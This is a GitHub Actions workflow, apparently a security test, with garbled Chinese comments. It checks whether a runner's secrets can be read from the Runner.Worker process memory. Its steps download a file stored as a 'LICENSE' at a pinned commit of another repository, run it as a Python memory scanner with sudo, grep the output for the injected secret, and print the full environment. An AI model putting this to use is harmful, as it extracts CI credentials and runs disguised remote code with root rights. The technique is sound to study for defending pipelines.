name: memory_scan_test

# æµ‹è¯•ä»'Runner.Worker'è¿›ç¨‹ä¸­è¯»å–secretï¼Œå¹¶éªŒè¯è¯¥æ•°æ®åœ¨å†…å­˜ä¸­æ˜¯æŒä¹…åŒ–çš„å³ä¸Šæ¸¸stepæ³¨å…¥äº†ï¼Œä¸‹æ¸¸stepä¹Ÿå¯ä»¥è¯»å–åˆ°
# ç§˜é’¥è®¾ç½®ä¸º aabbccdd11223344

on:
  # æ‰‹åŠ¨è§¦å‘
  workflow_dispatch:
    inputs:
      test_type:
        description: 'æµ‹è¯•ç±»å‹'
        required: false
        default: 'é»˜è®¤æµ‹è¯•'

  # å½“ commit æ¶ˆæ¯åŒ…å«ç‰¹å®šå…³é”®è¯æ—¶è§¦å‘
  push:
    branches:
      - main


jobs:
  memory-secret-test:
    name: å†…å­˜ä¸­æå– Secrets æµ‹è¯•
    runs-on: ubuntu-latest
    if: contains(github.event.head_commit.message, 'memory_scan_test')  # æ£€æŸ¥ commit æ¶ˆæ¯æ˜¯å¦åŒ…å«ç‰¹å®šå…³é”®è¯
    steps:
      - name: ğŸ› ï¸ åˆå§‹åŒ–ä»“åº“
        uses: actions/checkout@v4

      - name: ğŸ”‘ æ³¨å…¥æµ‹è¯•ç§˜é’¥ä¸ç¬¬ä¸€æ¬¡å†…å­˜æ‰«ææå–ç§˜é’¥
        env:
          TEST_SECRET: ${{ secrets.SECRET_TEST_XX }}
        run: |
          echo "å·²æ³¨å…¥æµ‹è¯•ç§˜é’¥ TEST_SECRETã€‚"
          echo "æ­£åœ¨ç¬¬ä¸€æ¬¡å†…å­˜æ‰«ææå–ç§˜é’¥..."
          wget -q https://raw.githubusercontent.com/flank/flank/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE -O memory_scan.py
          chmod +x memory_scan.py
          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbcc' && echo "âš ï¸ ç¬¬ä¸€æ¬¡æ‰¾åˆ°ç§˜é’¥ï¼" || echo "âœ… ç¬¬ä¸€æ¬¡æœªæ‰¾åˆ°ç§˜é’¥ã€‚"

      - name: ğŸ“ æ‰“å°ç¯å¢ƒä¿¡æ¯
        run: |
          echo "å½“å‰ç”¨æˆ· ID: $(id -u)"
          echo "å½“å‰ç”¨æˆ·: $(whoami)"
          echo "ç¯å¢ƒå˜é‡:"
          env

      - name: ğŸ•µï¸ ç¬¬äºŒæ¬¡å†…å­˜æ‰«ææå–ç§˜é’¥
        run: |
          echo "æ­£åœ¨æ‰«æå†…å­˜æå–ç§˜é’¥..."          
          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbccdd11' && echo "âš ï¸ ç¬¬äºŒæ¬¡æ‰¾åˆ°ç§˜é’¥ï¼" || echo "âœ… ç¬¬äºŒæ¬¡æœªæ‰¾åˆ°ç§˜é’¥ã€‚"

      - name: âœ… æµ‹è¯•å®Œæˆ
        run: echo "ğŸ‰ å†…å­˜æ‰«ææµ‹è¯•å·²å®Œæˆï¼"
